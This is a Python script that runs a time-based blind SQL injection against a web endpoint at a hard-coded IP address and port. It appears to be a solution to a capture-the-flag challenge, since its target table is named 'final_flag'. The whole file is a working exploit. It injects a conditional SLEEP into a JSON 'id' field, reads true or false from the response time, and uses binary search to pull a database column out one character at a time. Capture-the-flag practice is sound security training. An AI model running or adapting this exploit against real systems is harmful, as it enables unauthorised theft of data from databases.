import json, time, urllib.request

URL = 'http://154.57.164.77:44944/action.php'
SLEEP = 0.8
THRESH = 0.5
TBL = 'production.final_flag'
COL = 'content'

def ask(cond):
    payload = {"id": "1 AND IF(%s, SLEEP(%s), 0)" % (cond, SLEEP)}
    data = json.dumps(payload).encode()
    req = urllib.request.Request(URL, data=data, headers={'Content-Type': 'application/json'})
    t0 = time.time()
    try:
        urllib.request.urlopen(req, timeout=SLEEP + 8).read()
    except Exception:
        pass
    return (time.time() - t0) > THRESH

def bsearch(expr, hi):
    lo = 0
    while lo < hi:
        mid = (lo + hi) // 2
        if ask('(%s) BETWEEN 0 AND %d' % (expr, mid)):
            hi = mid
        else:
            lo = mid + 1
    return lo

print('table exists :', ask('(SELECT COUNT(*) FROM %s) BETWEEN 1 AND 99' % TBL), flush=True)
length = bsearch('SELECT LENGTH(%s) FROM %s' % (COL, TBL), 200)
print('length       :', length, flush=True)
out = ''
for pos in range(1, length + 1):
    code = bsearch('SELECT ASCII(SUBSTRING(%s,%d,1)) FROM %s' % (COL, pos, TBL), 126)
    out += chr(code)
    print('pos %2d -> %r  (%s)' % (pos, chr(code), out), flush=True)
print('FINAL:', out, flush=True)
